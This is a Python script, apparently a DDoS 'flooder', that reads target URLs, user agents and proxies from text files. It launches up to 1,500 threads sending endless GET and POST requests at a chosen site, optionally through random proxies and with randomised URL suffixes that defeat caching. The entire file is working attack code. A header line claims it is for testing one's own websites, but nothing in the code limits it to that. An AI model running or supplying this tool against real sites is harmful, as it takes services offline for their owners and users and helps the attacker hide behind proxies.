# -*- coding: utf-8 -*-
# Script created for testing your own websites
# by Alexey Privalov | www.alex0007.ru

import threading
import http.client
import urllib.parse
import random
import sys
import string


class Flooder(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        try:
            cur_url = urllib.parse.urlparse(random.choice(interface.url))
            if len(interface.proxies) == 0:  # setting direct connection here
                connection = http.client.HTTPConnection(cur_url.netloc, timeout=random.randint(interface.min_timeout,
                                                                                               interface.max_timeout))
                url_str = cur_url.path + cur_url.params + cur_url.query
            else:  # connect via random proxy
                connection = http.client.HTTPConnection(random.choice(interface.proxies))
                url_str = cur_url.scheme + '://' + cur_url.netloc + cur_url.path + cur_url.params + cur_url.query
            while True:
                if not interface.append_rand_string_to_url:
                    connection.request(method=random.choice(interface.request_methods), url=url_str,
                                       headers=interface.cur_header)
                else:
                    randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
                    connection.request(method=random.choice(interface.request_methods), url=url_str + randstr,
                                       headers=interface.cur_header)
                if interface.wait_for_response:
                    connection.getresponse().read()

        except:
            sys.exit()
            pass


class Interface():
    user_agents = []  # in file 'useragents.txt'
    proxies = []  # in file 'proxies.txt' if none - attack directly
    url = []  # from file 'urls.txt' or enter manually
    target = None
    cur_header = None

    referrer = "website_load"
    request_methods = ["GET", "POST"]
    thread_limit = 1500
    append_rand_string_to_url = False
    min_timeout = 30
    max_timeout = 30
    wait_for_response = True


    def read_data(self):
        self.read_useragents()
        self.read_proxies()
        self.read_urls()


    @staticmethod
    def read_file_to_array(file_desc):
        file_desc.seek(0)
        array = [line.strip() for line in file_desc]
        return array

    def read_useragents(self):
        file = open("useragents.txt", "a+")
        self.user_agents = self.read_file_to_array(file)
        if len(self.user_agents) == 0:
            def_user_agent = 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1797.2 Safari/537.36'
            self.user_agents.append(
                def_user_agent)
            file.write(
                def_user_agent)
        file.close()
        self.cur_header = {
            "User-agent": random.choice(self.user_agents),
            "Referrer": self.referrer,
            "Accept-Encoding": "gzip,deflate",
            "Connection": "Keep-Alive"
        }

    def read_urls(self):
        file = open("urls.txt", "a+")
        self.url = self.read_file_to_array(file)
        if len(self.url) == 0 and __name__ == '__main__':
            print('Enter target url or IP ( e.g. "http://google.com/" or "http://195.208.0.133/"):')
            self.target = input()
            self.url.append(self.target)
        file.close()

    def read_proxies(self):
        file = open("proxies.txt", "a+")
        self.proxies = self.read_file_to_array(file)
        file.close()

    def start_flood(self):
        while True:
            if threading.active_count() < self.thread_limit:
                Flooder().start()


interface = Interface()

if __name__ == '__main__':
    interface.read_data()

    interface.target = urllib.parse.urlparse(random.choice(interface.url))
    print(str(len(interface.user_agents)) + ' user agents detected')
    print(str(len(interface.url)) + ' urls detected')
    print(str(len(interface.proxies)) + ' proxies detected')
    print(str(interface.thread_limit) + ' threads')
    print("Flooding %s" % interface.target.netloc)

    interface.start_flood()
